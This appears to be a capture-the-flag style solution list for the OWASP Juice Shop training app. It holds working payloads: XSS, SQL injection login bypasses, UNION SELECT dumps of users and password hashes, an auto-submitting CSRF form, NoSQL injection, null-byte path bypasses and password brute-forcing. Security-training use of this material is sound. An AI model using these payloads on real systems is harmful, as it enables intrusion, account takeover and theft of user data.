# OWASP Juice Shop<br>
## 1 STAR
### Score Board<br>
Firefox > Debugger > Search score > found: /score-board<br><br>
http://localhost:3000/#/score-board<br>

### Bully Chatbot<br>
Menu > Support Chat > Keep spamming coupon <br><br>

### DOM XSS<br>
search bar > <iframe src="javascript:alert(`xss`)"><br><br>

### Bonus Payload<br>
Search bar <br>
```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```
### Confidential Document<br>
http://localhost:3000/ftp > acquisitions.md<br><br>

### Error Handling<br>
Account Login > put ' in email and password fields<br><br>

### Exposed Metrics<br>
http://localhost:3000/metrics<br><br>

### Outdated Allowlist<br>
gospider -v -s http://127.0.0.1:3000/ -o gospider_output<br>
cd gospider_output
cat 127_0_0_1 | grep code-200<br><br>

### Missing Encoding<br>
change # to %23<br>
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg<br><br>

### Zero Stars<br>
http://localhost:3000/#/contact<br>
burp proxy > repeater > rating:0<br><br>

### Repetitive Registration<br>
http://localhost:3000/#/register<br>
burp proxy > repeater > passwordRepeat:""<br><br>

## 2 STAR
### Login Admin<br>
http://localhost:3000/#/login<br>
email:admin' or true--<br>
password:'<br><br>

### Admin Section<br>
http://localhost:3000/#/administration<br><br>

### Five-Star Feedback<br>
http://localhost:3000/#/administration<br>
delete button<br>

### Empty User Registration<br>
http://localhost:3000/#/login<br>
burp proxy > repeater > email:"",password:"",passwordRepeat:""<br><br>

### Empty User Registration<br>
email:mc.safesearch@juice-sh.op<br>
password:Mr. N00dles<br>

### Meta Geo Stalking<br>
http://localhost:3000/#/forgot-password<br>
exiftool favorite-hiking-place.png <br>
36°57’31.38″ N 84°20’53.58″ W <br>
burp suite > repeater<br>
email: john@juice-sh.op<br>
secret:Daniel Boone National Forest<br>

### Weird Crypto
hash analyzer > 4b2e6b2618920cb1713bb801cd05401e<br>
http://localhost:3000/#/contact <br>
Comment: md5 > submit <br>

### Visual Geo Stalking
http://localhost:3000/#/forgot-password<br>
http://localhost:3000/assets/public/images/uploads/IMG_4253.jpg<br>
email: emma@juice-sh.op<br>
secret: ITsec<br>

### View Basket
http://localhost:3000/#/basket<br>
burp suite > repeater<br>
GET /rest/basket/X HTTP/1.1 <br>

### Security Policy
localhost:3000/.well-known/security.txt<br>

### Deprecated Interface 
http://localhost:3000/#/complain <br>
sudo apt install npm<br>
sudo npm -g install js-beautify<br>
js-beautify main.js > main1.js<br>
grep pdf main1.js<br>
```
allowedMimeType: ["application/pdf", "application/xml", "text/xml", "application/zip", "application/x-zip-compressed", "multipart/x-zip"],["ng2FileSelect", "", "id", "file", "type", "file", "accept", ".pdf,.zip", "aria-label", "Input area for uploading a single invoice PDF or XML B2B order file or a ZIP archive containing multiple invoices or orders\x3c!----\x3e", 2, "margin-left", "10px", 3, "uploader"]
rename .xml file extension to .zip or .pdf > uoload and submit
burp suite > repeater > remove .zip to .xml extension
Content-Disposition: form-data; name="file"; filename="legal.xml.zip"
```
### Login Admin
http://localhost:3000/#/login<br>
email:admin@juice-sh.op<br>
burp suite > intruder > positions: password > attack type: sniper<br>
payloads > usr/share/wordlist/fern-wifi/common.txt <br>

## 3 STAR
### Upload type
http://localhost:3000/#/complain <br>
rename .txt file extension to .zip or .pdf > uoload and submit<br>
burp suite > repeater > remove .zip to .txt extension<br>
Content-Disposition: form-data; name="file"; filename="legal.txt.zip"<br>

### Admin Registration
http://localhost:3000/#/register<br>
burp suite > proxy <br>
Post response > role:"customer" <br>
Post request > "role":"admin" <br>

### Bjoern's Favorite Pet 
http://localhost:3000/#/forgot-password<br>
email:bjoern@owasp.org <br>
secret: Zaya<br>

### CAPTCHA Bypass 
http://localhost:3000/#/contact <br>
burp suite > proxy > repeater <br>
send x10 <br>

### CSRF
download firefox 96.0 <br>
http://localhost:3000/profile > login into account <br>
http://htmledit.squarefree.com/ <br>
submit form: <br>
```
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

### Database schema
http://localhost:3000/#/search?q=<br>
burp suite > proxy > repeater <br>
GET /rest/products/search?q=apple'))union%20select%20sql,2,3,4,5,6,7,8,9%20from%20sqlite_master-- HTTP/1.1<br>

### Upload size

### Manipulate Basket 
Add to basket<br>
burp suite > proxy > repeater <br>
POST /api/BasketItems/ HTTP/1.1 <br>
```
"ProductId":24,
"BasketId":"1",
"quantity":1,
"BasketId":"3"
```

### Reset Jim's Password 
http://localhost:3000/#/forgot-password<br>
email:jim@juice-sh.op<br>
secret: Samuel<br>

###  Forged Review 
add review for item<br>
burp suite > proxy<br>
"author":"emma@juice-sh.op"<br>

### Login Bender
http://localhost:3000/#/login<br>
email: bender@juice-sh.op'--<br>
password: '<br>

### Login Amy
http://localhost:3000/#/login<br>
burp suite > proxy<br>
"email":"amy@juice-sh.op"<br>
"password":"K1f....................."<br>

### GDPR Data Erasure 
burp suite > proxy > repeater <br>
GET /rest/products/search?q=apple'))union%20select%20deletedAt,email,username,4,5,6,7,8,9%20from%20Users-- HTTP/1.1<br>
http://localhost:3000/#/login<br>
email:chris.pike@juice-sh.op'--<br>
password:'<br>

### Deluxe Fraud
http://localhost:3000/#/deluxe-membership<br>
firefox > inspect elements on Pay button<br>
remove disabled="true",mat-button-disabled<br>
burp suite > proxy > repeater <br> 
"paymentMode":"paid" <br>

### Payback time
Add to basket <br>
burp suite > proxy<br>
POST /api/BasketItems/ HTTP/1.1<br>
"ProductId":41,"BasketId":"1","quantity":-999<br>
check out<br>

### Privacy Policy Inspection 
firefox > highlighted glowing text > inspect <br>
span class="hot"<br>
search .hot<br>
http://localhost we may also instruct you to refuse all reasonably necessary responsibility<br>
http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility<br>

### Product tampering
burp suite > repeater<br>
GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
PUT /api/products/9 HTTP/1.1<br>
Content-Type: application/json<br>
{"description":"<a href=\"https://owasp.slack.com\""}<br>

## 4 STAR

### Easter Egg
### Nested Easter Egg
### Poison Null Byte 
http://localhost:3000/ftp<br>
GET /ftp/eastere.gg%2500.md HTTP/1.1<br>
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt<br>
online Caesar ciper: /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg<br>

### Forgoteen Sales Backup
http://localhost:3000/ftp<br>
GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1<br>

### Misplaced Signature File 
http://localhost:3000/ftp<br>
GET /ftp/suspicious_errors.yml%2500.md HTTP/1.1<br>

### Forgotten Developer Backup
http://localhost:3000/ftp<br>
GET /ftp/package.json.bak%2500.md HTTP/1.1<br>

### Leaked Unsafe Product
burp suite > proxy > repeater<br>
GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
id":11,"name":"Rippertuer Special Juice","description":"Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br />This item has been made unavailable because of lack of safety standards. (This product is unsafe! We plan to remove it from the stock!)"<br>
https://pastebin.com/90dUgd7s<br>
http://localhost:3000/#/contact<br>
Comment: Hueteroneel Eurogium Edule<br>

### Vulnerable Library
http://localhost:3000/ftp<br>
GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
http://localhost:3000/#/contact<br>
Comment:marsdb ~0.6,grunt ~1.0,express-jwt 0.1.3,js-yaml 3.10,sequelize ~4,sanitize-html 1.4.2,socket.io ~2.0<br>

### Legacy Typosquatting
http://localhost:3000/#/contact<br>
comment: epilogue-js<br>

### NoSQL Manipulation
write review<br>
burp suite > proxy > repeater<br>
PATCH /rest/products/reviews HTTP/1.1<br>
{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }<br>

### Allowlist Bypass
http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop<br>

### Christmas special
burp suite > proxy > repeater<br>
GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
POST /api/BasketItems/ HTTP/1.1
{"ProductId":10,"BasketId":"1","quantity":1}


### Ephemeral Accountant
http://localhost:3000/#/login <br>
burp suite > proxy > repeater <br>
{"email":"' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage','' as 'totpSecret', 1 as 'isActive','1999-08-16 14:14:41.644 +00:00' as 'createdAt','1999-08-16 14:33:41.930 +00:00' as 'updatedAt',null as 'deletedAt')--","password":""} <br>

### Expired Coupon
firefox > Debugger<br>
search: discount > WMNSDY2023<br>
bash > timedatectl set-ntp 0 > timedatectl set-time '2019-03-08' <br>

### Login Bjoern
firefox > Debugger > search: oauth <br>
bash > cat main1.js | grep password: <br>
password: btoa(e.email.split("").reverse().join("")),<br>
email: bjoern.kimminich@gmail.com<br>
moc.liamg@hcinimmik.nreojb<br>
bash > echo -n moc.liamg@hcinimmik.nreojb | base64<br>
bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=<br>
http://localhost:3000/#/login<br>
POST /rest/user/login HTTP/1.1<br>
{"email":"bjoern.kimminich@gmail.com","password":"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}<br>

### Steganography
http://localhost:3000/#/about<br>
firefox > inspect photo
http://localhost:3000/assets/public/images/carousel/5.png
sudo dpkg -i openstego_0.8.6-1_all.deb
openstego > extract data
http://localhost:3000/#/contact
comment > pickle rick

### User Credentials
burp suite > proxy > repeater
GET /rest/products/search?q=apple'))union%20select%20id,username,email,password,5,6,7,8,9%20from%20Users-- HTTP/1.1






























